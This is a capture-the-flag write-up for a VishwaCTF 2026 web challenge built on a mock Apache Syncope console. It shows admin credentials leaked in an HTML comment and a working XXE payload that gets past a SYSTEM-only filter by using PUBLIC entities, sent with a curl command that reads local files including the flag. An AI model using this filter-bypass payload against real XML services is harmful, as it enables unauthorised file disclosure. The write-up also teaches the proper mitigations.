# Keymaster Secrets — Part 1: Apache Syncope — VishwaCTF 2026 (Web)

## TL;DR

Find admin credentials in an HTML comment on `/maintenance`, login, then bypass the XXE filter on `/rest/keymaster/params` using `PUBLIC` entities instead of blocked `SYSTEM` entities to read the flag file.

## Description

> The Syncope admin console has recently undergone a security patch after reports of XML-related vulnerabilities. Developers claim that all dangerous XML constructs — especially external entities — are now blocked.

Target: `https://keymaster.vishwactf.com/login` — A Flask app simulating Apache Syncope v4.0.3.

## Analysis

### Step 1: Enumeration

`/robots.txt` reveals three hidden paths:

```
Disallow: /maintenance
Disallow: /api/docs
Disallow: /rest/
```

### Step 2: Credential Leak

`/maintenance` contains admin credentials in an HTML comment:

```html
<!--
  TODO (ops-team): remove before go-live
  Emergency console access for maintenance window:
    Username : admin
    Password : S3cur3Syncop3!@dm1n
  Temp access expires: 2026-06-01

  NOTE: BI reporting service coming soon on separate port — token in runtime dir
-->
```

### Step 3: Authenticated Console Access

Login at `/login` with `admin:S3cur3Syncop3!@dm1n` grants access to `/console` with a dashboard linking to `/keymaster` — an XML parameter management interface.

`/api/docs` documents the REST API:

| Method | Path | Notes |
|--------|------|-------|
| POST | `/rest/keymaster/params` | XML parsed server-side, value stored and echoed |
| POST | `/rest/users/import` | Bulk XML import (entities fully blocked) |
| POST | `/rest/config/validate` | No entity expansion |

### Step 4: XXE Bypass — PUBLIC vs SYSTEM

The `/rest/keymaster/params` endpoint blocks `SYSTEM` entity declarations:

```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```
→ `"Security policy violation: XML documents must not contain SYSTEM entity declarations."`

But `PUBLIC` entities are not filtered:

```xml
<!ENTITY xxe PUBLIC "anything" "file:///etc/hostname">
```
→ `{"parameter":{"key":"test","value":"7c0eddc758e7"},"status":"created"}`

## Vulnerability

**CWE-611: Improper Restriction of XML External Entity Reference** — The XML security filter only checks for `SYSTEM` keyword in entity declarations. The `PUBLIC` keyword, which also allows URI-based external entity resolution, is not blocked. This is a classic incomplete XXE mitigation.

Reference: CVE-2026-23795 (per flag).

## Exploit

```bash
SESSION="session=<cookie_from_login>"

# Read the flag
curl -s -b "$SESSION" "https://keymaster.vishwactf.com/rest/keymaster/params" \
  -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "x" "file:///opt/syncope/runtime/.flag">]>
<parameter>
  <key>flag</key>
  <value>&xxe;</value>
  <type>STRING</type>
</parameter>'
```

Response:
```json
{"parameter":{"key":"flag","type":"STRING","value":"VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}"},"status":"created"}
```

## Flag

```
VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}
```

## Key Lessons

- Blocking only `SYSTEM` in XXE filters is insufficient — `PUBLIC` entities also resolve external URIs
- Proper XXE mitigation requires disabling DTD processing entirely (`disallow_doctype_decl`) or disabling all external entity resolution at the parser level
- HTML comments in maintenance/debug pages are a common source of credential leaks
- `robots.txt` disallow entries are recon goldmines, not security controls
